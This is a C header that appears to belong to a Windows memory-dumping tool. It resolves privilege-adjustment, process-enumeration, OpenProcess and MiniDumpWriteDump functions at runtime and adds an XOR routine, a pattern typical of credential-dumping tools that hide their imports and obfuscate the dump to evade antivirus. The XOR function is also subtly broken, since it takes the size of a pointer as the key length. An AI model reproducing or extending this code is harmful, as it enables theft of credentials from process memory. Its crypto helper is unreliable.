#pragma once


typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
	ULONG Privilege, BOOL Enable,
	BOOL CurrentThread, PULONG Enabled);

_RtlAdjustPrivilege MRtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
    GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege");

typedef LPVOID(WINAPI* _HeapAlloc)(
    HANDLE hHeap , DWORD  dwFlags,
    SIZE_T dwBytes);

_HeapAlloc MHeapAlloc = (_HeapAlloc)GetProcAddress(
    GetModuleHandleW(L"Kernel32.dll"), "HeapAlloc");

typedef HANDLE(WINAPI* _CreateToolhelp32Snapshot)(
    DWORD dwFlags, DWORD th32ProcessID);

_CreateToolhelp32Snapshot MCreateToolhelp32Snapshot = (_CreateToolhelp32Snapshot)GetProcAddress(
    GetModuleHandleW(L"Kernel32.dll"), "CreateToolhelp32Snapshot");

typedef BOOL(WINAPI* _Process32FirstW)(
    HANDLE hSnapshot, LPPROCESSENTRY32W lppe);

_Process32FirstW MProcess32FirstW = (_Process32FirstW)GetProcAddress(
    GetModuleHandleW(L"Kernel32.dll"), "Process32FirstW");


typedef BOOL(WINAPI* _Process32NextW)(
    HANDLE hSnapshot, LPPROCESSENTRY32W lppe);

_Process32NextW MProcess32NextW = (_Process32NextW)GetProcAddress(
    GetModuleHandleW(L"Kernel32.dll"), "Process32NextW");


typedef HANDLE(WINAPI* _OpenProcess)(
    DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);

_OpenProcess MOpenProcess = (_OpenProcess)GetProcAddress(
    GetModuleHandleW(L"Kernel32.dll"), "OpenProcess");

typedef BOOL(WINAPI* _MiniDumpWriteDump)(
    HANDLE hProcess, DWORD ProcessId, 
    HANDLE hFile, MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam, 
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, 
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam);

_MiniDumpWriteDump MMiniDumpWriteDump = (_MiniDumpWriteDump)GetProcAddress(
    LoadLibraryA("Dbghelp.dll"), "MiniDumpWriteDump");


extern char * Xorcrypt(char* content, DWORD length ,char* secretKey)
{
    for (UINT i = 0; i < length; i++)
    {
        content[i] ^= secretKey[i % sizeof(secretKey)];
    }

    return content;
}
